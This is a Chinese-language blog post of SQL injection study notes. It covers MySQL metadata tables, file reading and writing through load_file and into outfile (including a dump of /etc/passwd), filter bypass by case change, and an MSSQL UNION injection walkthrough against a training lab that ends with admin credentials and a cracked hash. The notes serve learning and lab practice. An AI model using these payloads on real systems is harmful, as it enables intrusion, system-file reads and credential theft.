@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>SQLi2 | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SQL注入 MySQL注入   一、information_schemainformation_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。 inform">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi2">
+<meta property="og:url" content="http://example.com/2024/02/01/Web-SQLi2/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="SQL注入 MySQL注入   一、information_schemainformation_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。 inform">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337095372-9725dc09-ce09-469e-bc9e-63dffac04d31.png">
+<meta property="article:published_time" content="2024-02-01T09:26:10.000Z">
+<meta property="article:modified_time" content="2024-02-02T03:34:29.685Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web-SQLi2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/01/Web-SQLi2/" class="article-date">
+  <time class="dt-published" datetime="2024-02-01T09:26:10.000Z" itemprop="datePublished">2024-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      SQLi2
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="SQL注入-MySQL注入"><a href="#SQL注入-MySQL注入" class="headerlink" title="SQL注入 MySQL注入"></a>SQL注入 MySQL注入</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6" alt="image">  </p>
+<h5 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h5><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
+<p>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p>
+<ul>
+<li><strong>SCHEMATA表</strong></li>
+</ul>
+<p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p>
+<p>获取到数据库名称</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">mysql&gt; <span class="keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| information_schema | utf8                       |</span><br><span class="line">| challenges         | gbk                        |</span><br><span class="line">| mysql              | latin1                     |</span><br><span class="line">| performance_schema | utf8                       |</span><br><span class="line">| security           | gbk                        |</span><br><span class="line">+--------------------+----------------------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>TABLES 表</li>
+</ul>
+<p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables <span class="built_in">limit</span> 0,5;</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS                        |</span><br><span class="line">| def           | information_schema | COLLATIONS                            |</span><br><span class="line">| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| def           | information_schema | COLUMNS                               |</span><br><span class="line">| def           | information_schema | COLUMN_PRIVILEGES                     |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>COLUMNS 表</li>
+</ul>
+<p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>USER_PRIVILEGES 表</li>
+</ul>
+<p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM USER_PRIVILEGES <span class="built_in">limit</span> 0,5;</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | SELECT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | INSERT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | UPDATE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | DELETE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | CREATE         | YES          |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">load_file()：读取函数</span><br><span class="line">into outfile或into dumpfile：导出函数</span><br><span class="line">路径获取常见方法：</span><br><span class="line">报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line">-1 union select 1,load_file(&#x27;文件路径&#x27;),3</span><br><span class="line">写入文件</span><br><span class="line">-1 union select 1,&#x27;x&#x27;,3 into outfile &#x27;文件路径&#x27;--+</span><br><span class="line">文件路径符号用/，如果是\，要写成\\</span><br><span class="line"></span><br><span class="line">常见文件读取列表：</span><br><span class="line"></span><br><span class="line">常见文件写入问题：魔术引号开关</span><br><span class="line">magic_quotes_gpc</span><br><span class="line"></span><br><span class="line">魔术引号及常见防护</span><br><span class="line"></span><br><span class="line">低版本注入配合读取或暴力</span><br><span class="line">字典或读取</span><br><span class="line"></span><br><span class="line">SQL语句干扰符号：&#x27; &quot; % ) &#125; 等，具体看写法</span><br></pre></td></tr></table></figure>
+
+<p>参考地址：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+<p>load_file						文件读取</p>
+<p>into outfile 或into dumpfile		文件写入</p>
+<p>查询是否有写入的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>&#x2F;tmp</td>
+<td>只允许在 &#x2F;tmp 目录导入导出</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody></table>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+<ul>
+<li>文件读取</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>): root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line"></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取敏感信息：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
+<p>如果存在过滤，比如说，把select替换为fuck，可以使用大写绕过过滤，写为Select，mysql对关键字大小写不敏感</p>
+<p>select  * from user where name like ‘%qyw%’</p>
+<p>那么前面带qyw或者后面带qyw的都会被搜出来</p>
+<p>值传递的方式，get，post，cookie，request</p>
+<p>cookie提交方式，抓包，添加数据</p>
+<p>Cookie: 参数&#x3D;参数值</p>
+<p>request是全部接受，用get，post或cookie都可以接受，我们大部分是黑盒测试，不知道对方代码是怎么写的，所以不知道接收数据时采用的是什么方法，如果采用的是request，那随便提交，如果是单一的，在注入时要使用到一些方法，有一些可以修改绕过提交方式</p>
+<p>server提交方式，可以获取浏览器的一些值<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuazi/p/9765012.html">$_SERVER详解 - 刷哥 - 博客园 (cnblogs.com)</a></p>
+<h5 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h5><p>提交的时候写成这种</p>
+<p>…</p>
+<p>{</p>
+<p>​	“username”:”admin”,</p>
+<p>​	“password”:”123456”</p>
+<p>}</p>
+<p>或者直接抓个包，按那种格式提交数据</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337095372-9725dc09-ce09-469e-bc9e-63dffac04d31.png" alt="数据库注入.png"></p>
+<h5 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">数据库类型：Access、MySQL、SQL server、</span><br><span class="line">结构</span><br><span class="line">access</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">MySQL等</span><br><span class="line">	数据库名</span><br><span class="line">		表名</span><br><span class="line">			列名</span><br><span class="line">				数据</span><br><span class="line">我们进行sql注入时，用到的权限是由连接数据库的用户权限决定的</span><br><span class="line">access数据库在进行注入时，不需要union select，因为它只有一个数据库，直接查询信息就行，它也没有收集数据库名信息，表名信息的表，所以在就行注入时，就只能进行暴力猜</span><br><span class="line">1、判断有几列</span><br><span class="line">2、暴力猜</span><br><span class="line"></span><br><span class="line">遗留问题：</span><br><span class="line">access注入时，暴力破解如果列名或表名猜解不到</span><br></pre></td></tr></table></figure>
+
+<h5 id="MSSQL（SQL-server）注入"><a href="#MSSQL（SQL-server）注入" class="headerlink" title="MSSQL（SQL server）注入"></a>MSSQL（SQL server）注入</h5><p>MSSQL注入 </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p>
+<p>例题为墨者学堂 SQL手工注入漏洞测试(Sql Server数据库)</p>
+<p>解题步骤：</p>
+<p><strong>1、判断是否是MSSQL</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</span><br></pre></td></tr></table></figure>
+
+<p>sysobjects是sql server独有的一个数据库</p>
+<p><strong>2、判断数据库版本</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--这个语句要在有回显的模式下才可以哦</span><br><span class="line">and substring((select @@version),22,4)=&#x27;2005&#x27;--适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2005的话就返回正常）</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、判断回显</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于题目中3是字符类型，所以要加引号</span><br><span class="line">?id=-2 union all select 1,2,&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p><strong>4、数据库名称</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,db_name(),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名称为 mozhe_db_v2</p>
+<p><strong>5、爆表</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27;),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p>当xtype&#x3D;’U’ 代表是用户建立的表</p>
+<p>得到表名为manage</p>
+<p><strong>6、爆字段</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p>解释一下col_name()，与object（）</p>
+<p>object ()：数据库中每个对象都有一个唯一的id值，object_id(name)可以根据表对象名称得到表对象的ID，object_id()只能返回用户创建的对像的ID,像以sys开头的表都是系统表所以返回不了的</p>
+<p>col_name（）：可以根据id值得到对像的名称，而且可以返回指定下标的结果.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),2) from sysobjects),&#x27;3&#x27;,4 得username</span><br><span class="line"></span><br><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),3) from sysobjects),&#x27;3&#x27;,4 得password</span><br></pre></td></tr></table></figure>
+
+<p>说明mange表总共有3列，分别为：id、username、password</p>
+<p><strong>7、爆数据</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select username from manage) ,(select password from manage where username in (&#x27;admin_mz&#x27;)),4</span><br></pre></td></tr></table></figure>
+
+<p>得到username为admin_mz</p>
+<p>password为72e1bfc3f01b7583，MD5解密，password为97285101</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/01/Web-SQLi2/" data-id="cls43dxy50000rkvfanov8qc7" data-title="SQLi2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/02/01/Web-SQLi1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SQLi1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/01/31/20240131/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">20240131</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 16.67px;">Web安全</a> <a href="/tags/learn/" style="font-size: 13.33px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/01/Web-SQLi1/">SQLi1</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/01/Web-SQLi2/">SQLi2</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/31/20240131/">20240131</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/31/Web-Basic/">Web-Basic</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/29/Paper-Yet%20Another%20Traffic%20Classifier%20A%20Masked%20Autoencoder%20Based%20Traffic%20Transformer%20with%20Multi-Level%20Flow%20Representation/">Yet Another Traffic Classifier</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
